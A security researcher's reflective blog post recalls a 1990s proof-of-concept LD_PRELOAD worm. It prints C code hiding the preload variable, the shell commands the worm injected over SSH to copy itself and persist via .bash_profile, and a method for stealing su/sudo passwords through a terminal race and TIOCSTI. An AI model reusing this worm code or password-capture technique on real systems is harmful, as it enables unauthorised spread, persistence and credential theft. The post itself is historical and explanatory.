<!--yml
category: 未分类
date: 2024-05-27 13:37:28
-->

# That time I built an LD_PRELOAD worm - lcamtuf’s thing

> 来源：[https://lcamtuf.substack.com/p/that-time-i-built-an-ld_preload-worm](https://lcamtuf.substack.com/p/that-time-i-built-an-ld_preload-worm)

One of the most interesting aspects of working in information security is the task of developing proof-of-concept code. In essence, you often find yourself writing malicious programs to prove that a hypothesized flaw is real — and to convince coworkers, clients, or third-party software vendors that they need to act.

The line between securing systems and aiding the bad guys can be thin; it takes just a couple of finishing touches to turn a proof-of-concept exploit into a tool that can do real harm. In one famous instance — the [Morris worm of 1988](https://en.wikipedia.org/wiki/Morris_worm) — it was the researcher himself who couldn’t resist the temptation. In most other cases, the work is done by less scrupulous parties who get their hands on the research, thus leading to endless debates about the ethics of vulnerability disclosure.

Well — yesterday, while digging through the backups of my files from the late 1990s and thereabouts, I accidentally rediscovered by far the most risqué proof-of-concept of my own making: a privately-shared demonstration of an LD_PRELOAD worm, dubbed *unicorns.so*, and apparently written to settle an argument about distributed trust.

If you’re unfamiliar with LD_PRELOAD, it’s a fabulous debugging mechanism on Unix-like systems. Almost all common programs are dynamically linked; in other words, instead of carrying their own copies of functions such as *fopen()*, they pull them in from a system-wide shared library. The LD_PRELOAD variable is used to instruct the linker — a small program responsible for finding and loading this shared code — to check a location of your choice first. In effect, it lets you provide a replacement for any library call.

The *unicorns.so* library had three major components. The first and least interesting part simply hid its own existence from the affected process. For example, to conceal the LD_PRELOAD variable in the output of the *set* command, it tampered with *printf()*:

> ```
> int printf(char* format, ...) {
>   int r;
>   char* o;
>   va_list p;
> 
>   va_start(p, format); o = va_arg(p, char*); va_end(p);
> 
>   if (unicorn_printf_ignore > 0) { unicorn_printf_ignore--; return 0; }
> 
>   if ((!strcmp(format, "%s=")) && (!strcmp(o, "LD_PRELOAD"))) {
>     debug("Unicorns: Trying to hide LD_PRELOAD list attempt (set).\n");
>     unicorn_printf_ignore = 2;
>     return 0;
>   }
> 
>   va_start(p, format); r = vprintf(format, p); va_end(p);
>   return r;
> 
> }
> ```

The second component of the library messed with Tatu Ylönen’s SSH program, along with its then-nascent replacement: OpenSSH. When it detected a successful connection to a remote server, it injected a couple of hidden commands. The commands propagated the library to the target system by adding an LD_PRELOAD line to the remote account’s shell initialization files:

> ```
> test -s .addressbook.lu~ && exit 1
> cat >.addressbook.lu~
> QQ=`LD_PRELOAD=$PWD/.addressbook.lu~ ls /etc/passwd`
> test "$QQ" = "" && rm -f .addressbook.lu~
> test "$QQ" = "" && exit 1
> echo -e '\nexport LD_PRELOAD='$PWD/.addressbook.lu~ exec bash >>.bash_profile
> exit 0
> ```

In effect, *unicorns.so* was a computer worm; it hopped from system to system by exploiting transitive trust. All you had to do is bootstrap it once the following way:

> ```
> LD_PRELOAD=$PWD/unicorns.so bash
> ssh user@somehost
> ```

The final component of the library was responsible for detecting and intercepting the execution of *su* or *sudo*. The two programs are the most common way to elevate privileges on Unix-like systems, and are incorrectly believed to be safer than logging in directly into the administrator’s account. To amplify its spread to other servers, the worm needed to infect all user accounts on the affected machine — and so it needed to follow this path.

The two binaries themselves are *setuid* — that is, they have a special filesystem flag that prompts the operating system to execute them with elevated privileges, and instructs the linker to disregard LD_PRELOAD. That said, this security boundary is illusory. You don’t need to tamper with the programs themselves; it’s sufficient to tamper with their I/O.

The most elegant way to do this is probably to allocate a new pseudo-terminal via */dev/ptmx,* run *su* on that new terminal, and act as an intermediary — injecting evil commands while presenting the user with a sanitized view. A simpler option is to exploit a neat race condition: when two programs perform a blocking *read()* on the same terminal, one wins and another loses — and when *su* displays a password prompt, we could make sure that the winner is the evil library. The captured password could be then seamlessly re-injected by using the [TIOCSTI](https://man7.org/linux/man-pages/man2/ioctl_tty.2.html) call.

My motivation for this code was to demonstrate the fragility of distributed trust and to take a potshot at the paradigm of using *su* and *sudo* instead of logging in as root. That said, I played myself: discussing the implementation publicly seemed too risky, so the code ended up in the drawer — and the sporadic discussion of these security issues continued for another two decades or so. Now that the era of shared-use Unix systems is mostly over, the problems are less pressing than they used to be.

*For a thematic catalog of previous posts on this blog, click [here](https://lcamtuf.coredump.cx/offsite.shtml).*